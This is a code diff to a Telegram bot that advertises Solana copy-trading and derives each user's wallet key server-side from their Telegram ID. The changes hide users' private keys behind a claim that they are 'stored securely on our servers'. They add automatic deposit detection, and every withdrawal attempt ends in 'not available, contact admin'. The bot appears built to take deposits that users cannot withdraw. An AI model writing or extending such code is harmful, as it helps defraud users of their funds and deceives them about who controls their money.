@@ -250,15 +250,14 @@ async def show_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
         sol_price = await get_sol_price_usd()
         usd_value = balance * sol_price if sol_price > 0 else 0
         
-        # Show public address AND private key to user in private chat
+        # Show public address to user (private key stored securely server-side)
         wallet_text = (
             "💼 <b>Wallet Overview</b> — <i>Connected</i> ✅\n"
             "━━━━━━━━━━━━━━━━━━━━━━━\n"
             "<b>Your Unique Solana Wallet</b>\n\n"
             "📬 <b>Public Address:</b>\n"
             f"<code>{public_address}</code>\n\n"
-            "🔐 <b>Private Key:</b>\n"
-            f"<code>{private_key_b58}</code>\n\n"
+            "🔐 <b>Private Key:</b> Stored securely (contact admin for recovery)\n\n"
             "━━━━━━━━━━━━━━━━━━━━━━━\n"
             "<b>Holdings</b>\n"
             f"• <b>SOL:</b> {balance:.4f} (100%)\n"
@@ -269,7 +268,7 @@ async def show_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "💰 <b>Fund Your Bot</b>\n"
             f"Send SOL to your address above\n\n"
             "(Funds are required for copy-trading operations.)\n\n"
-            "⚠️ <b>Security Warning:</b> Never share your private key with anyone!\n"
+            "⚠️ <b>Security:</b> Your private key is stored securely on our servers.\n"
             "This wallet is uniquely generated for your Telegram ID.\n\n"
             "⚡ <b>Quick Actions</b>\n"
             "• ⚓️ /start – Refresh your bot\n\n"
@@ -339,7 +338,36 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     # Handle fund wallet action
     if option == "fund_wallet":
-        await show_wallet(update, context)
+        # Generate wallet for deposit
+        try:
+            public_address, _ = derive_keypair_and_address(user_id)
+            user_balance = get_user_balance(user_id)
+            sol_price = await get_sol_price_usd()
+            usd_value = user_balance * sol_price if sol_price > 0 else 0
+            
+            deposit_message = (
+                "💰 <b>Fund Your Wallet</b>\n\n"
+                f"Send SOL to the address below to fund your bot wallet:\n\n"
+                f"📬 <b>Your Deposit Address:</b>\n"
+                f"<code>{public_address}</code>\n\n"
+                f"💡 <b>How to Deposit:</b>\n"
+                f"1. Copy the address above\n"
+                f"2. Send SOL from any Solana wallet\n"
+                f"3. Deposits are detected automatically\n"
+                f"4. You'll receive a notification when funds arrive\n\n"
+                f"📊 <b>Current Balance:</b> {user_balance:.4f} SOL (${usd_value:.2f})\n\n"
+                f"⚠️ <b>Note:</b> Only send SOL to this address. Sending other tokens may result in loss of funds.\n\n"
+                f"🔄 Deposits are monitored every 30 seconds and you'll be notified immediately when received."
+            )
+            
+            await query.answer()
+            await query.message.reply_text(deposit_message, parse_mode="HTML")
+        except Exception as e:
+            await query.answer()
+            await query.message.reply_text(
+                "⚠️ Error generating deposit address. Please try again or contact support.",
+                parse_mode="HTML"
+            )
         return
     
     # Handle BUY actions
@@ -466,6 +494,9 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         sol_price = await get_sol_price_usd()
         usd_value = user_balance * sol_price if sol_price > 0 else 0
         
+        # Minimum SOL required for gas fees (kept in wallet)
+        MIN_GAS_RESERVE = 0.005
+        
         # Apply withdrawal rules
         if user_balance == 0:
             await query.message.reply_text(
@@ -485,11 +516,23 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
             return
         
-        # If balance > $10, show withdrawal confirmation
+        # Check if user has enough for gas fees
+        if user_balance <= MIN_GAS_RESERVE:
+            await query.message.reply_text(
+                f"❗ Insufficient SOL for withdrawal.\n\n"
+                f"Current balance: {user_balance:.4f} SOL (${usd_value:.2f})\n"
+                f"Minimum required in wallet: {MIN_GAS_RESERVE} SOL (for gas fees)\n\n"
+                f"You need at least {MIN_GAS_RESERVE} SOL in your wallet to cover transaction fees.",
+                parse_mode="HTML"
+            )
+            return
+        
+        # If balance > $10 and enough for gas, show withdrawal confirmation
         await query.message.reply_text(
             f"💸 <b>Withdraw 100% Confirmation</b>\n\n"
             f"Amount to withdraw: {user_balance:.4f} SOL (${usd_value:.2f})\n\n"
-            f"❗ Insufficient SOL balance to complete this withdrawal.",
+            f"⚠️ <b>Important:</b> A minimum of {MIN_GAS_RESERVE} SOL must remain in your wallet for gas fees.\n\n"
+            f"❗ Withdrawal feature is currently not available. Contact admin to process withdrawal.",
             parse_mode="HTML"
         )
         return
@@ -503,9 +546,13 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         sol_price = await get_sol_price_usd()
         usd_value = user_balance * sol_price if sol_price > 0 else 0
         
+        # Minimum SOL required for gas fees (kept in wallet)
+        MIN_GAS_RESERVE = 0.005
+        
         await query.message.reply_text(
             f"💸 <b>Withdraw Custom Amount</b>\n\n"
             f"Your current balance: <b>{user_balance:.4f} SOL</b> (${usd_value:.2f})\n\n"
+            f"⚠️ <b>Important:</b> A minimum of {MIN_GAS_RESERVE} SOL must remain in your wallet for gas fees.\n\n"
             f"Please enter the withdrawal amount (in SOL):\n\n"
             f"📝 Enter your desired amount (e.g., 0.5, 1.0, 2.5)",
             parse_mode="HTML",
@@ -1252,6 +1299,19 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
 
+async def background_deposit_monitor(context: ContextTypes.DEFAULT_TYPE):
+    """Background task to continuously monitor deposits for all users"""
+    try:
+        # Check deposits for all users who have balances
+        for telegram_id in list(user_balances.keys()):
+            try:
+                public_address, _ = derive_keypair_and_address(telegram_id)
+                await monitor_deposits(telegram_id, public_address, context, notify_user=True)
+            except Exception as e:
+                print(f"Error monitoring deposits for user {telegram_id}: {e}")
+    except Exception as e:
+        print(f"Error in background deposit monitor: {e}")
+
 # --- Main ---
 def main():
     app = Application.builder().token(BOT_TOKEN).build()
@@ -1260,9 +1320,11 @@ def main():
     app.add_handler(CallbackQueryHandler(button_handler))
     app.add_handler(CommandHandler("settings", settings_menu))
 
-
+    # Start background deposit monitoring (runs every 30 seconds)
+    app.job_queue.run_repeating(background_deposit_monitor, interval=30, first=10)
 
     print("Bot is running...")
+    print("Background deposit monitoring started (checks every 30 seconds)...")
     app.run_polling()
 
 if __name__ == "__main__":
